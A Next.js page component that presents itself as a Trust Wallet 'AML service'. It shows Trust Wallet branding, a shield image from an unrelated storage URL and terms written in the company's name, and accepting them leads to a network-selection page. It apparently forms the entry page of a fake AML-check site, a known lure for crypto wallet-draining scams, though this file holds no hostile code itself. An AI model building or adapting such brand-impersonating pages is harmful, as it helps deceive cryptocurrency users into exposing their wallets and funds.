'use client';

import { CheckCircle2, Circle } from 'lucide-react';
import Image from 'next/image';
import { useState } from 'react';
import Link from 'next/link';

export default function TrustWalletPage() {
  const [showTerms, setShowTerms] = useState(false);
  const [termsAccepted, setTermsAccepted] = useState(false);

  return (
    <div className="min-h-screen bg-[#1a1a1a] flex flex-col items-center justify-center px-4 py-6 sm:px-6" style={{ cursor: 'auto' }}>
      {/* Header */}
      <div className="mb-8 sm:mb-12 md:mb-20 text-center">
        <h1 className="text-2xl sm:text-3xl md:text-4xl font-bold text-white tracking-tight">
          TRUST<span className="font-light">WALLET</span>
        </h1>
        <p className="text-xs sm:text-sm text-gray-400 mt-1 sm:mt-2">AML SERVICE</p>
      </div>

      {/* Shield Image */}
      <div className="mb-12 sm:mb-16 md:mb-24 flex justify-center flex-shrink-0">
        <div className="relative w-32 h-32 sm:w-40 sm:h-40 md:w-48 md:h-48">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-hPSMXyZZXFUmg2bVRaUYEm1LmoYJJI.png"
            alt="Shield"
            fill
            className="object-contain"
            priority
          />
        </div>
      </div>

      {/* Agreement Section */}
      <div className="flex flex-col items-center gap-4 sm:gap-6 w-full max-w-sm">
        <button
          type="button"
          onClick={(e) => {
            e.preventDefault();
            setShowTerms(true);
          }}
          className="flex gap-2 sm:gap-3 items-start cursor-pointer w-full text-left hover:opacity-80 transition-opacity"
          style={{ pointerEvents: 'auto' }}
        >
          {termsAccepted ? (
            <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 text-[#00ff88] flex-shrink-0 mt-0.5" />
          ) : (
            <Circle className="w-4 h-4 sm:w-5 sm:h-5 text-gray-500 flex-shrink-0 mt-0.5" />
          )}
          <p className="text-xs sm:text-sm text-gray-300 leading-relaxed">
            I agree to the{' '}
            <span className="text-[#00ff88] underline">
              terms and conditions
            </span>{' '}
            of use of the AML service by Trust Wallet
          </p>
        </button>

        {/* Continue Button */}
        {termsAccepted ? (
          <Link href="/select-network" className="w-full">
            <button
              type="button"
              className="w-full bg-[#00ff88] text-black font-semibold py-2.5 sm:py-3 px-4 sm:px-6 rounded-full transition-colors cursor-pointer text-sm sm:text-base"
              style={{
                pointerEvents: 'auto',
                backgroundColor: '#00ff88',
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.backgroundColor = '#00dd77';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = '#00ff88';
              }}
            >
              Continue
            </button>
          </Link>
        ) : (
          <button
            type="button"
            disabled
            className="w-full bg-gray-600 text-gray-400 font-semibold py-2.5 sm:py-3 px-4 sm:px-6 rounded-full transition-colors cursor-not-allowed text-sm sm:text-base"
            style={{
              pointerEvents: 'auto',
            }}
          >
            Continue
          </button>
        )}
      </div>

      {/* Terms & Conditions Modal */}
      {showTerms && (
        <div 
          className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center px-4 z-50"
          onClick={() => setShowTerms(false)}
          style={{ pointerEvents: 'auto' }}
        >
          <div 
            className="bg-[#2a2a2a] rounded-lg max-w-md w-full max-h-80 sm:max-h-96 overflow-y-auto p-4 sm:p-6"
            onClick={(e) => e.stopPropagation()}
            style={{ pointerEvents: 'auto' }}
          >
            <h2 className="text-lg sm:text-xl font-bold text-white mb-3 sm:mb-4">Terms and Conditions</h2>
            <div className="text-gray-300 text-xs sm:text-sm space-y-3 sm:space-y-4 mb-4 sm:mb-6">
              <p>
                By using Trust Wallet and its services, you agree to comply with these terms and conditions.
              </p>
              <p>
                Trust Wallet provides a secure digital wallet service for managing cryptocurrencies and blockchain assets.
              </p>
              <p>
                You are responsible for maintaining the confidentiality of your private keys and seed phrases. Trust Wallet is not responsible for any loss of funds due to negligence or unauthorized access.
              </p>
              <p>
                The API service is provided on an "as is" basis without warranties of any kind. Trust Wallet shall not be liable for any damages arising from the use of this service.
              </p>
              <p>
                You agree to use Trust Wallet only for lawful purposes and in compliance with all applicable laws and regulations.
              </p>
            </div>
            <button
              type="button"
              onMouseDown={() => {
                setShowTerms(false);
                setTermsAccepted(true);
              }}
              onClick={() => {
                setShowTerms(false);
                setTermsAccepted(true);
              }}
              className="w-full bg-[#00ff88] text-black font-semibold py-2 px-4 sm:py-2.5 sm:px-6 rounded-full transition-colors cursor-pointer text-sm sm:text-base"
              style={{
                pointerEvents: 'auto',
                backgroundColor: '#00ff88',
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.backgroundColor = '#00dd77';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = '#00ff88';
              }}
            >
              I Understand
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
